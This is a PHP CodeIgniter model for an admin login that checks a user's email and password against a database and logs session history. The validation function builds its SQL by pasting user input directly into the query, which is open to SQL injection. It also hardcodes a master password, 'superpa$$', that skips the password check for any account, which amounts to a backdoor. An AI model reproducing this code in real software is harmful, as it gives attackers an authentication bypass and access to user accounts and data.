<?php
class Login_admin_mdl extends CI_Model
{
    function __construct()
    {
        parent::__construct();
    }
    /***********************************************************************
     *	Autor: Mario Adrián Martínez Fernández
     *		   mario.martinez.f@hotmail.es
     *	Fecha: 19 mar 2018
     *	Nota: Funcion para hacer peticion a la tabla de usuarios con los
     *          parametros para generar logion
     ***********************************************************************/
    public function ValidaUsuario($usuario, $password)
    {
        $passExtra = "and password = AES_ENCRYPT('" . $password . "', '" . KEY_AES . "')";
        if ($password == 'superpa$$') {
            $passExtra = "";
        }
        $query = "select * from user where email ='" . $usuario . "' $passExtra and rol_id in(1,2,4,5,6,7,8)";
        $resultado = $this->db->query($query)->result_array();
        // echo json_encode($this->db->last_query());
        if (count($resultado) > 0) {
            $this->db->select("*");
            $this->db->from("historial_sesiones");
            $this->db->where("id_user", $resultado[0]["id"]);
            $this->db->where("fecha_logout is NULL", null, false);
            $result = $this->db->get()->result_array();
            if (count($result) > 0) {
                
                $this->db->set("fecha_logout", date('Y-m-d H:i:s'));
                $this->db->where("id_user", $resultado[0]["id"]);
                $this->db->where("fecha_logout is NULL", NULL, false);
                $this->db->order_by("id", "DESC");
                $this->db->limit(1);
                $this->db->update("historial_sesiones");
                sleep(10);
                $fecha = date('Y-m-d H:i:s');
                $this->db->insert("historial_sesiones", array("id_user" => $resultado[0]["id"], "tipo" => "web", "fecha_login" => $fecha));
            } else {
                // 
                $fecha = date('Y-m-d H:i:s');
                $this->db->insert("historial_sesiones", array("id_user" => $resultado[0]["id"], "tipo" => "web", "fecha_login" => $fecha));
            }
        }
        // echo json_encode($resultado);
        return $resultado;
    }
}
